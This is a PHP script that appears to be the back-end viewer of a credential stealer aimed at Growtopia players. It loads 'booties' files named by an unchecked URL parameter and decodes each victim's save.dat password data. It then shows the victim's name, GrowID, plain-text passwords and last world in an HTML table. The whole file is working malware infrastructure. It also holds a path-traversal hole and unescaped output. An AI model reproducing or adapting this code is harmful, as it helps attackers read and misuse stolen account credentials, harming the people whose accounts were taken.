<?php

    require("files/verified.php");

    include("header.php");
    include("password_decoder.php");
	
	$array = explode("<=break=>", file_get_contents("files/booties/".$_GET["file"].".txt"));
	
	file_put_contents("temp.dat", base64_decode($array[0]));

    $data = get_savedat("temp.dat");
    $keys = array_keys($data);
    
    echo ("<table id='t01'>
		<col width='250'>
		<col width='750'>
	<tr>
		<th>Variable</th>
		<th>Data</th>
	</tr>");
     
	$gtname = "";
	$gtuser = "";
	$gtpass = "";
	$gtpassfil = "";
	$gtlastworld = "";
	   
    foreach ($keys as &$key) 
    {
		if ($key == "name")
		{
			$gtname = $data[$key];
		}
		else if ($key == "tankid_name")
		{
			$gtuser = $data[$key];
		}
		else if ($key == "tankid_password")
		{
			// Normal
			
			$gtpass = $data[$key];
			
			// Filtered
			
			$array = explode("<BR>", $data[$key]);
			
			foreach ($array as $filtered)
			{
				if (!preg_match('/[^a-zA-Z\d]/', $filtered))
				{
					if (!empty($filtered))
					{
						$gtpassfil .= $filtered."<BR>";
					}
				}
			}
		}
		else if ($key == "lastworld")
		{
			$gtlastworld = $data[$key];
		}
    }
	
	if ($gtname != null)
	{
		echo "<tr><td><font color='lime'>Name</font></td><td>".$gtname."</td></tr>";
	}
	if ($gtuser != null)
	{
		echo "<tr><td><font color='lime'>GrowID</font></td><td>".$gtuser."</td></tr>";
	}
	if ($gtpass != null)
	{
		echo "<tr><td><font color='lime'>Passwords</font></td><td>".$gtpass."</td></tr>";
	}
	if ($gtpassfil != null)
	{
		echo "<tr><td><font color='lime'>Passwords (Filetered)</font></td><td>".$gtpassfil."</td></tr>"; 
	}
	if ($gtlastworld != null)
	{
		echo "<tr><td><font color='lime'>Last World</font></td><td>".$gtlastworld."</td></tr>";
	}

    echo "</table>";
	
	unlink("temp.dat");
	
?>